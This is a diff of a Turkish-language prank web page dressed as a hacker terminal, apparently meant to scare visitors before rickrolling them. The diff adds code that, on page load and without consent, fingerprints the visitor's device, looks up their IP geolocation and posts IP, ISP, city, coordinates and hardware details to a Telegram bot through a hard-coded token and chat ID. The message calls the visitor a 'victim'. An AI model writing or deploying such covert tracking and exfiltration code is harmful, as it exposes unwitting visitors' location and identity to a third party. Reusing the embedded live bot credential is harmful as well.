@@ -2,30 +2,33 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Sistem Veri Analizi</title>
+  <title>Sistem Teşhis ve Güvenlik Paneli</title>
   <style>
     html, body {
       margin: 0; padding: 0; width: 100%; height: 100vh;
-      background: black; color: #0f0; font-family: 'Courier New', monospace;
+      background: #000; color: #0f0; font-family: 'Courier New', monospace;
       overflow: hidden; display: flex; justify-content: center; align-items: center;
     }
     #container {
       width: 95vw; max-width: 1200px; height: 95vh;
       background-color: #050505; border: 1px solid #0f0;
       box-shadow: 0 0 20px #003300; display: flex; flex-direction: column;
+      position: relative;
     }
     #terminal {
       flex: 1; padding: 20px; overflow-y: auto; font-size: 13px; line-height: 1.5;
+      white-space: pre-wrap;
     }
-    #map { height: 300px; border-top: 1px solid #0f0; filter: grayscale(100%) invert(100%) contrast(150%); }
+    #map { height: 250px; border-top: 1px solid #0f0; filter: grayscale(100%) invert(100%) brightness(0.7); }
     .scan-line {
-      position: absolute; width: 100%; height: 2px; background: rgba(0, 255, 0, 0.1);
-      top: 0; animation: scan 3s linear infinite; pointer-events: none;
+      position: absolute; width: 100%; height: 4px; background: rgba(0, 255, 0, 0.05);
+      top: 0; animation: scan 4s linear infinite; pointer-events: none; z-index: 10;
     }
     @keyframes scan { from { top: 0; } to { top: 100%; } }
-    #rickrollButton {
+    #exitBtn {
       background: #0f0; color: #000; border: none; padding: 15px;
-      font-weight: bold; cursor: pointer; display: none;
+      font-weight: bold; cursor: pointer; display: none; width: 100%;
+      text-transform: uppercase; letter-spacing: 2px;
     }
   </style>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.css" />
@@ -35,59 +38,135 @@
   <div id="container">
     <pre id="terminal"></pre>
     <div id="map"></div>
-    <button id="rickrollButton">SİSTEMİ DURDUR VE ÇIK</button>
+    <button id="exitBtn">PROTOKOLÜ DURDUR</button>
   </div>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.js"></script>
 
   <script>
     const terminal = document.getElementById('terminal');
-    const btn = document.getElementById('rickrollButton');
-    
+    const btn = document.getElementById('exitBtn');
+
     function log(text, delay = 0) {
       return new Promise(res => {
         setTimeout(() => {
-          terminal.textContent += `> ${text}\n`;
+          terminal.textContent += `[SYSTEM]: ${text}\n`;
           terminal.scrollTop = terminal.scrollHeight;
           res();
         }, delay);
       });
     }
 
-    async function startExploit() {
-      await log("ERİŞİM PROTOKOLÜ BAŞLATILDI...", 500);
-      await log("KULLANICI IP ADRESİ SORGULANIYOR...", 800);
+    // Sahte HWID (Cihaz Parmak İzi) oluşturma
+    function generateFingerprint() {
+        const data = [
+            navigator.userAgent,
+            navigator.language,
+            screen.colorDepth,
+            navigator.hardwareConcurrency,
+            screen.width + 'x' + screen.height,
+            new Date().getTimezoneOffset(),
+            !!window.sessionStorage,
+            !!window.localStorage
+        ].join('||');
+        
+        // Basit bir hash fonksiyonu (HWID gibi görünmesi için)
+        let hash = 0;
+        for (let i = 0; i < data.length; i++) {
+            hash = ((hash << 5) - hash) + data.charCodeAt(i);
+            hash |= 0;
+        }
+        return "HWID-" + Math.abs(hash).toString(16).toUpperCase() + "-" + (Math.random() * 10000).toFixed(0);
+    }
+
+    // Ekran kartı (GPU) bilgisini çekme
+    function getGPU() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        if (!gl) return "Bilinmiyor";
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
+    }
+
+    async function startProcess() {
+      await log("ROOT ERİŞİMİ SAĞLANDI...", 400);
+      await log("DONANIM ANALİZİ BAŞLATILIYOR...", 600);
+
+      const hwid = generateFingerprint();
+      const gpu = getGPU();
+      
+      const deviceInfo = {
+        res: `${screen.width}x${screen.height}`,
+        plat: navigator.platform,
+        cores: navigator.hardwareConcurrency || "N/A",
+        ua: navigator.userAgent,
+        time: new Date().toLocaleString('tr-TR'),
+        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor"
+      };
+
+      await log(`CIHAZ KIMLIĞI: ${hwid}`, 300);
+      await log(`GPU: ${gpu}`, 300);
+      await log(`RAM: ${deviceInfo.ram}`, 300);
 
       try {
-        // İZİN İSTEMEYEN SESSİZ YÖNTEM (IP TABANLI)
         const response = await fetch('https://ipwho.is/');
         const data = await response.json();
 
-        await log(`BAĞLANTI KURULDU: ${data.ip}`, 500);
-        await log(`BÖLGE: ${data.city} / ${data.region}`, 400);
-        await log(`ISP: ${data.connection.isp}`, 400);
-        await log(`KOORDİNATLAR HESAPLANIYOR: ${data.latitude}, ${data.longitude}`, 600);
-        await log("SİSTEME SIZILIYOR: %85...", 1000);
-        await log("KONUM HARİTALANDI. BİLGİLER TELEGRAM'A GÖNDERİLDİ.", 500);
+        await log(`AĞ: ${data.connection.isp}`, 400);
+        await log(`LOKASYON: ${data.city} / ${data.latitude}, ${data.longitude}`, 400);
 
-        // Haritayı Sessizce Yükle
-        const map = L.map('map', {zoomControl: false, attributionControl: false}).setView([data.latitude, data.longitude], 13);
+        const map = L.map('map', {zoomControl: false, attributionControl: false}).setView([data.latitude, data.longitude], 14);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
         L.marker([data.latitude, data.longitude]).addTo(map);
 
-        // Telegram'a Gönder (Senin bot bilgilerini buraya tekrar ekleyebilirsin)
-        const msg = `🎯 Kurban Yakalandı!\nIP: ${data.ip}\nŞehir: ${data.city}\nCihaz: ${navigator.platform}`;
-        fetch(`https://api.telegram.org/bot8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg/sendMessage?chat_id=6400737507&text=${encodeURIComponent(msg)}`);
+        // Telegram Mesajı
+        const tgMsg = `
+⚡ <b>KRITIK VERI SIZINTISI</b> ⚡
 
+🔑 <b>DONANIM KIMLIĞI (HWID):</b>
+<code>${hwid}</code>
+
+📱 <b>CIHAZ BILGILERI:</b>
+<b>İşlemci:</b> ${deviceInfo.cores} Çekirdek
+<b>Bellek:</b> ${deviceInfo.ram}
+<b>GPU:</b> ${gpu}
+<b>Çözünürlük:</b> ${deviceInfo.res}
+<b>Platform:</b> ${deviceInfo.plat}
+
+🌍 <b>AĞ & KONUM:</b>
+<b>IP:</b> ${data.ip}
+<b>ISP:</b> ${data.connection.isp}
+<b>Konum:</b> ${data.city}, ${data.country}
+<b>Harita:</b> https://www.google.com/maps?q=${data.latitude},${data.longitude}
+
+🔍 <b>USER AGENT:</b>
+<code>${deviceInfo.ua}</code>
+        `;
+
+        await fetch(`https://api.telegram.org/bot8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: '6400737507',
+            text: tgMsg,
+            parse_mode: 'HTML'
+          })
+        });
+
+        await log("VERİLER BULUT SUNUCUSUNA AKTARILDI.", 500);
+        await log("TAKİP AKTİF EDİLDİ.", 400);
+        
         btn.style.display = 'block';
       } catch (e) {
-        await log("HATA: Güvenlik duvarı aşılamadı.");
+        await log("HATA: Güvenlik Duvarı Aşılamadı.");
       }
     }
 
-    btn.onclick = () => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    btn.onclick = () => {
+      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    };
 
-    window.onload = startExploit;
+    window.onload = startProcess;
   </script>
 </body>
 </html>
